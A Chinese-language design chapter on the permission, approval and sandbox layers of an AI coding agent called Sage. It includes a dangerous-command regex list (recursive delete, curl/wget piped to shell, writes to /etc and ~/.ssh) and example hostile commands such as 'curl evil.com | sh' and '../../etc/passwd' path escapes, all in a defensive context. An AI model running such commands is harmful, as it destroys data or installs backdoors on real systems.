# 06 - 权限、审批与沙盒

> Last verified against: `dev/sage-v7@1009e53` (2026-07-20)

> 本章目标：能讲清 Sage 的五道门（Permission / Policy / Approval / Execute / Workspace）、11 个危险命令模式、ApprovalManager 的 once/session/always/deny 四级审批、以及 Local/Container Sandbox 的边界。

## 为什么模型不能直接执行

模型会犯错，也会被注入。如果模型说"执行 `rm -rf /`"系统就真的执行，一次就完了。所以模型和真实执行之间必须有门。

Sage 在模型和执行之间设了**五道门**，每道门回答不同的问题：

```
模型说"我要 patch_file('src/app.py', ...)"
  ↓
① PermissionChecker - "你有没有权做这件事"
② ToolPolicyChecker - "你的做法合不合理"
③ ApprovalManager - "需要用户确认吗"
④ RegisteredTool.execute - "真正执行"
⑤ WorkspaceContext - "路径安全吗"
```

任何一道门拒绝，工具调用转成 `ToolResult(is_error=True)` 返回给模型，模型可以修正参数重试。**不抛异常，不炸 WebSocket**。

## ① PermissionChecker：有没有权做

四种 permission mode：

| 模式 | 文件编辑 | 普通 Shell | 危险 Shell |
| --- | --- | --- | --- |
| `default` | 请求审批 | 请求审批 | 请求审批 |
| `accept_edits` | 自动允许 | 请求审批 | 请求审批 |
| `auto` | 自动允许 | 自动允许 | 仍请求审批 |
| `plan` | 禁止 | 禁止 | 禁止 |

```python
class PermissionChecker:
    def check(self, tool, args, workspace) -> PermissionDecision:
        # 1. plan mode 只允许只读工具
        if self.plan_mode:
            if tool.read_only:
                return PermissionDecision.allow("plan_read_only")
            return PermissionDecision.deny("plan_mode_tool_not_allowed", "plan_mode_write_guard")

        # 2. write_scope 检查（子代理限定写入范围）
        if tool.name in {"write_file", "patch_file"} and self.write_scope:
            scope_decision = self._check_write_scope(args, workspace)
            if not scope_decision.allowed:
                return scope_decision

        # 3. 只读工具直接允许
        if tool.read_only:
            return PermissionDecision.allow("read_only")

        # 4. 不需要审批的工具直接允许
        if tool.requires_approval is False:
            return PermissionDecision.allow("approval_not_required")

        # 5. read_only 模式硬拒绝
        if self.read_only:
            return PermissionDecision.deny("approval_denied", "read_only_block")

        # 6. 按 approval_policy 决定
        if self.approval_policy == "auto":
            return PermissionDecision.allow("approval_auto")
        if self.approval_policy == "never":
            return PermissionDecision.deny("approval_denied")
        # ask 模式 -> 需要审批
        return PermissionDecision.allow("approval_required")  # 标记需要审批，由 ApprovalManager 处理
```

**关键设计**：
- `plan` mode 通过 PermissionChecker 强制只读，不是靠 system prompt 提示。这比 prompt 约束可靠--策略位于执行边界，模型绕不过去。
- `auto` 模式下危险 Shell 仍需审批（`check_dangerous_command` 在 PermissionChecker 里再检查一次）。
- `write_scope` 是子代理隔离的关键：子代理的写入路径必须落在指定子树内。

## ② ToolPolicyChecker：做法合不合理

Permission 回答"有没有权做"，Policy 回答"当前做法是否合理"。两者分开检查，不合并成巨大 if/else。

```python
class ToolPolicyChecker:
    def check(self, tool, args) -> ToolPolicyDecision:
        # 1. patch_file 前必须先 read（has_fresh_read）
        if tool.name == "patch_file":
            path = self.workspace.path(args.get("path", ""))
            if not self.workspace.has_fresh_read(path):
                return ToolPolicyDecision.deny("prior_read_required")

        # 2. write_file 覆盖已有文件前必须先读
        if tool.name == "write_file" and self.workspace.path(args.get("path", "")).exists():
            if not self.workspace.has_fresh_read(path):
                return ToolPolicyDecision.deny("prior_read_required")

        # 3. 搜索不该用 cat/grep/rg/find/ls，应该用 search 工具
        if tool.name == "run_shell":
            cmd = str(args.get("command", ""))
            if self._is_search_command(cmd):
                return ToolPolicyDecision.deny("use_search_tool_instead")
```

### read-before-write 策略

这是防止"盲改"的关键。模型必须先 `read_file` 看到当前内容，才能 `patch_file` 或 `write_file`。

`WorkspaceContext` 用指纹追踪：

```python
@dataclass
class WorkspaceContext:
    _read_fingerprints: dict[str, tuple[bool, int, int]]  # path -> (exists, size, mtime_ns)

    def mark_read(self, raw_path):
        path = self.path(raw_path)
        self._read_fingerprints[str(path)] = self._fingerprint(path)

    def has_fresh_read(self, raw_path) -> bool:
        path = self.path(raw_path)
        current = self._fingerprint(path)
        return self._read_fingerprints.get(str(path)) == current
```

指纹是 `(exists, size, mtime_ns)` 三元组。读取后记录，写入前检查--如果文件被改过（mtime 变了），`has_fresh_read` 返回 False，拒绝写入。

**为什么用指纹不用内容 hash**：快。读取文件内容算 hash 太慢，指纹只看 metadata。代价是 `touch` 命令会改变 mtime 导致指纹失效（但这其实是安全行为--文件被碰过了就该重新读）。

### 搜索命令的 policy

```python
def _is_search_command(self, cmd: str) -> bool:
    # 禁止用 cat/grep/rg/find/ls 做搜索
    # 应该用 search 工具（rg + Python fallback）
    ...
```

为什么：`search` 工具的结果会被 `ToolResultStore` 归档（>16KB 外存 + preview），而 `run_shell` 的 `grep` 输出是 inline 的，会塞满 context。

## ③ ApprovalManager：需要用户确认

### 11 个危险命令模式

```python
DANGEROUS_PATTERNS = (
    (r"\brm\s+-[^\n;|&]*r", "Recursive delete", "rm_recursive"),
    (r"\bgit\s+reset\s+--hard\b", "Hard git reset", "git_reset_hard"),
    (r"\bgit\s+push\b[^\n;|&]*--force", "Force push", "git_force_push"),
    (r"\bchmod\s+777\b", "World-writable permission", "chmod_777"),
    (r"\bcurl\b.*\|\s*(sh|bash)\b", "Pipe curl to shell", "curl_pipe_shell"),
    (r"\bwget\b.*\|\s*(sh|bash)\b", "Pipe wget to shell", "wget_pipe_shell"),
    (r"(^|\s)sudo(\s|$)", "sudo", "sudo"),
    (r"(^|\s)>+\s*/etc/", "Write to /etc", "write_etc"),
    (r"(^|\s)>+\s*~/.ssh/", "Write to ~/.ssh", "write_ssh"),
    (r"\bdocker\s+compose\s+down\b", "Stop compose services", "docker_compose_down"),
    (r"\bkill\s+-9\b", "Force kill", "kill_9"),
)
```

`check_dangerous_command()` 用正则匹配，命中任意一个就要求审批。**即使 permission mode 是 `auto`，危险 Shell 仍转成 `approval_required`**。

### 审批流程

```
ToolExecutor 检测到需要审批
  ↓
ApprovalManager.submit(session_id, tool, args, description, pattern_key)
  ↓ 创建 ApprovalEntry（含 threading.Event）
  ↓
yield ApprovalRequiredEvent(approval_id, tool, args, description)
  ↓
ToolExecutor 用 asyncio.to_thread(entry.event.wait, 1.0) 等待
  ↓ 每秒检查 should_stop
  ↓
前端显示审批卡片，用户点 approve/deny
  ↓
POST /api/v1/coding/{session_id}/approval/respond
  ↓
ApprovalManager.resolve(session_id, approval_id, choice)
  ↓ 设置 threading.Event
  ↓
ToolExecutor 收到信号，继续执行或返回拒绝 ToolResult
```

等待最长 300 秒，期间每秒检查 Stop。

### 四级审批选择

| 选择 | 含义 | 实现 |
| --- | --- | --- |
| `once` | 只批准当前这一次 | 执行后清除 |
| `session` | 当前 session 内同类命令不再弹 | 加入 session 级 pattern allow set |
| `always` | 跨 session 永久允许 | **当前实现等同于 session**（命名与实现边界） |
| `deny` | 拒绝 | 返回 `ToolResult(is_error=True)` |

> [!warning] "always" 当前没有跨 session 的永久语义
> 这是命名与实现需要注意的边界。真正的跨 session 永久允许需要持久化到配置文件，当前没做。

### 审批绑定

审批绑定 `session_id + run_id + tool_call_id + args_digest`。**参数变化后旧批准失效**：

```python
# 不能用旧 approval 执行新参数的工具调用
if approval.args_digest != current_args_digest:
    return ToolResultEvent(is_error=True, content="approval args changed")
```

这防止"用户批准了 `rm -rf node_modules`，模型改参数成 `rm -rf /` 还用旧 approval 执行"。

## ④ RegisteredTool.execute：真正执行

详见 [Tool Registry 与工具系统](05-tools-registry.md)。关键点：
- ThreadPoolExecutor 隔离（不阻塞 async loop）
- 超时控制（默认 30s）
- 异常归一（转成 `ToolResult(is_error=True)`）

## ⑤ WorkspaceContext：路径安全

```python
class WorkspaceContext:
    def path(self, raw_path: str | Path) -> Path:
        raw = Path(raw_path)
        candidate = raw if raw.is_absolute() else Path(self.root) / raw
        resolved = candidate.resolve()  # 解析 .. 和 symlink
        try:
            resolved.relative_to(self.root)  # 必须在 root 下
        except ValueError:
            raise ValueError(f"path escapes workspace root: {raw_path}")
        return resolved
```

### 路径逃逸攻击

模型可能传 `../../etc/passwd` 或 `/etc/passwd`，`path()` 用 `resolve()` + `relative_to(root)` 拒绝。

### 符号链接攻击

V6.6+ 的 `TranscriptStore` 用 `O_NOFOLLOW` 拒绝符号链接：

```python
_DIRECTORY_FLAGS = os.O_RDONLY | os.O_DIRECTORY | os.O_CLOEXEC | os.O_NOFOLLOW
```

`O_NOFOLLOW` 让 `open()` 不跟随符号链接。如果攻击者把 `transcript.jsonl` 替换成 symlink 指向 `/etc/passwd`，`open()` 直接报错。

### 硬链接攻击

```python
def _validate_file(file_fd: int, name: str) -> None:
    metadata = os.fstat(file_fd)
    if not stat.S_ISREG(metadata.st_mode):
        raise ValueError(f"non-regular file rejected: {name}")
    if metadata.st_nlink != 1:
        raise ValueError(f"hardlink file rejected: {name}")
```

`st_nlink != 1` 检查硬链接数。普通新文件 nlink=1，如果有人创建了硬链接 nlink>1，拒绝。

### inode 验证（防 TOCTOU）

```python
def _verify_database_and_sidecars(self) -> tuple[int, int]:
    # 打开前记录 inode
    metadata = os.fstat(database_fd)
    expected = (metadata.st_dev, metadata.st_ino)
    return expected

def _verify_connected_inode(self, expected):
    # SQLite 连接后再验证 inode
    metadata = os.fstat(database_fd)
    actual = (metadata.st_dev, metadata.st_ino)
    if actual != expected:
        raise ValueError("database changed while opening")
```

`(st_dev, st_ino)` 是文件唯一标识。打开前记录，连接后验证。如果 inode 变了，说明文件被替换了（删除 + 重建），拒绝。

## 沙盒（Sandbox）

### 为什么需要沙盒

`run_shell` 工具能执行任意命令。如果直接在服务器上跑，用户可以：
- `rm -rf /` 删库
- `curl evil.com | sh` 装后门
- 占满磁盘 / OOM 服务器
- 看其他用户的文件

permission 和 approval 是"问用户能不能做"，沙盒是"**即使做了也限制影响范围**"。

### SandboxPort

```python
class SandboxPort(Protocol):
    def acquire(self, request: SandboxRequest) -> SandboxDescriptor: ...
    def execute(self, handle: SandboxHandle, command: str) -> SandboxResult: ...
    def release(self, handle: SandboxHandle) -> None: ...
```

### LocalWorkspaceSandbox

开发环境用，绑定现有 workspace 路径安全：

```python
class LocalWorkspaceSandbox:
    # 直接在服务器上跑，但绑定 workspace path policy
    # 适合开发环境，不适合生产
```

**生产环境不允许任意 host 路径 Local Sandbox**--等于 host code execution。

### ContainerSandbox

```python
class ContainerSandbox:
    # Docker 容器隔离
    # - CPU/内存/PID 限制
    # - 网络策略
    # - workspace mount（只读或受限读写）
    # - 终止回收
```

V7 Beta 已实现 Container Sandbox 与契约测试，但仍需在目标生产环境验证 CPU、内存、PID、
网络、workspace mount、终止回收和并发隔离。完成前不能开放公网任务执行。

### 子代理的 write_scope

子代理（Research/Practice）有 `write_scope` 限制写入路径：

```python
# 子代理只能写指定子树
worker_manager.spawn(
    description="...",
    prompt="...",
    subagent_type="worker",
    write_scope=["src/experiment/"],  # 只能写这个子树
)
```

**注意**：`write_scope` 不是 OS/container sandbox。同一个 Python 进程，同一个服务器文件系统。真正的隔离需要 ContainerSandbox。

## Plan Mode 的特殊性

Plan mode 不是 system prompt 提示，而是通过 PermissionChecker 强制只读：

```python
if self.plan_mode:
    if tool.read_only:
        return PermissionDecision.allow("plan_read_only")
    return PermissionDecision.deny("plan_mode_tool_not_allowed", "plan_mode_write_guard")
```

`exit_plan_mode` tool 只创建 `PlanReviewEntry`，不直接退出。用户通过 REST approval 后 Runtime 才切回 default mode。

**为什么不在 system prompt 里写"请不要改文件"**：因为 prompt 约束不可靠，模型可能被 prompt injection 绕过。策略位于执行边界，模型绕不过去。

## 外部参考的使用边界

安全能力不能靠竞品表格证明。审批层数、危险模式数量或“有沙盒”都不等于真实隔离。
本章只评估 Sage 的默认配置、绕过路径、fail-closed 行为和故障测试；借鉴外部设计时，
必须基于其当前威胁模型和一手实现重新审查。

## 第一入口

按顺序打开：

1. `core/coding/tool_executor/permissions.py::PermissionChecker.check` - 权限检查
2. `core/coding/tool_executor/policy.py::ToolPolicyChecker.check` - 策略检查
3. `core/coding/tool_executor/approval.py::ApprovalManager` - 审批管理
4. `core/coding/tool_executor/approval.py::DANGEROUS_PATTERNS` - 11 个危险模式
5. `core/coding/tool_executor/executor.py::ToolExecutor.execute` - 执行管线
6. `core/coding/context/workspace.py::WorkspaceContext.path` - 路径安全
7. `packages/sage_harness/sage_harness/sandbox/base.py::SandboxPort` - 沙盒 Port
8. `core/harness/container_sandbox.py` - Container 沙盒

## 测试证据

- `tests/core/coding/test_permissions.py` - 4 种 mode + write_scope
- `tests/core/coding/test_tool_executor.py` - 执行管线
- `tests/core/coding/test_approval.py` - 审批 + 危险命令
- `tests/core/coding/test_workspace.py` - 路径安全 + 指纹
- `tests/core/coding/test_plan_review.py` - plan mode 审批
- `tests/harness/test_sandbox_contract.py` - 沙盒契约

## 当前边界

> [!warning] 权限/审批/沙盒有几个已知局限
> - `always` 审批当前等同于 `session`（无跨 session 永久语义）
> - 审批同进程 `ApprovalManager`，服务器重启丢 pending approval（LangGraph durable interrupt 未实现）
> - Container Sandbox 尚未完成目标生产环境的 admission 与故障恢复验证
> - `write_scope` 不是 OS sandbox，子代理隔离靠 PermissionChecker 兜底
> - 跨 agent 文件状态协调（FileStateRegistry）未实现，多子代理并发改同一文件会冲突
> - 超时不 kill 底层操作（详见 [Tool Registry 与工具系统](05-tools-registry.md)）

## 自测

1. 五道门各自回答什么问题？为什么分开而不是一个巨大 if/else？
2. Plan mode 为什么通过 PermissionChecker 强制而不是 system prompt 提示？
3. 11 个危险命令模式有哪些？为什么 `auto` 模式下危险 Shell 仍需审批？
4. `has_fresh_read` 用指纹不用内容 hash 的优缺点？
5. 审批绑定 `args_digest` 解决什么攻击？
6. LocalWorkspaceSandbox 和 ContainerSandbox 的区别？为什么生产不能用 Local？
7. `O_NOFOLLOW` + `st_nlink != 1` + inode 验证各自防什么攻击？

下一章：[Skills 与命令系统](07-skills-commands.md)
